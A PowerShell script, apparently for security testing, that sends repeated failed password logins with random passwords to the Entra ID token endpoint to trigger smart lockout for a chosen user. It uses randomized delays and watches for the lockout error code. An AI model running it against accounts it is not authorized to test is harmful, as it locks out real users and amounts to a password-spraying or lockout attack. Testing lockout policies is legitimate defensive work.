# Entra ID - Smart Lockout Attack and User
# Purpose: Trigger smart lockout based on the configured threshold and duration

# Define test parameters
$tenantID = "put your tenant id here"
$userEmail = "user@domain.com"
$lockoutThreshold = 60  # Set based on Smart Lockout policy. The default is 10.
$maxAttempts = 500  # Slightly above the threshold for validation
$failedAttempts = 4 # Changes to the Entra ID user failed attempts

# Microsoft Authentication Token Endpoint
$tokenEndpoint = "https://login.microsoftonline.com/$tenantID/oauth2/v2.0/token"

# Function to generate a random password meeting Entra ID complexity rules
function Generate-RandomPassword {
    param (
        [int]$length = 14  # Recommended minimum length
    )

    # Define character sets (uppercase, lowercase, numbers, special characters)
    $upperChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    $lowerChars = "abcdefghijklmnopqrstuvwxyz"
    $numbers = "0123456789"
    $specialChars = "!@#$%^&*-_+=?"  # Avoid restricted characters like " and \

    # Ensure password contains at least one from each category
    $password = (
        ($upperChars | Get-Random -Count 2) +
        ($lowerChars | Get-Random -Count 4) +
        ($numbers | Get-Random -Count 2) +
        ($specialChars | Get-Random -Count 2)
    ) -join ""

    # Shuffle characters to ensure randomness
    -join ($password.ToCharArray() | Get-Random -Count $length)
}

Write-Host "[+] Starting Smart Lockout Simulation for: $userEmail"

for ($i = 1; $i -le $maxAttempts; $i++) {
    Write-Host "[+] Attempt ($i): Generating random password..."
    $password = Generate-RandomPassword -length 12  # Create new password per attempt
    Write-Host "[+] Using password: $password"

    # Construct login request with incorrect credentials
    $body = @{
        grant_type    = "password"
        scope         = "openid offline_access"
        client_id     = "your-client-id"  # Use a test app if needed
        username      = $userEmail
        password      = $password
    }

    try {
        # Simulate login request
        $response = Invoke-RestMethod -Uri $tokenEndpoint -Method Post -Body $body -ErrorAction Stop
        Write-Host "[!] Unexpected success, check Smart Lockout settings!"
    } catch {
        Write-Host "[-] Failed login (expected)."
        $failedAttempts++

        # Extract error details and datacenter information
        try {
            $stream = $_.Exception.Response.GetResponseStream()
            $responseBytes = New-Object byte[] $stream.Length
            $stream.Position = 0
            $stream.Read($responseBytes, 0, $stream.Length) | Out-Null
            
            $errorDetails = [text.encoding]::UTF8.GetString($responseBytes) | ConvertFrom-Json | Select -ExpandProperty error_description
            $datacenter = "{0,-6}" -f ($_.Exception.Response.Headers["x-ms-ests-server"].Split(" ")[2])

            Write-Host "Error Details: $errorDetails"
            Write-Host "Datacenter: $datacenter"

            # Detect if user is locked based on error response
            if ($errorDetails -match "AADSTS50053") {
                Write-Host "[!] User has been locked out by Smart Lockout policy!"
                break
            }
        } catch {
            Write-Host "[-] Failed to extract error details."
        }

        # Stop if we reach the lockout threshold
        if ($failedAttempts -ge $lockoutThreshold) {
            Write-Host "[!] Smart Lockout should activate now."
            break
        }
    }

    # Introduce a delay between attempts to mimic real-world login attempts
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 9)
}

Write-Host "[+] Smart Lockout Simulation Completed."

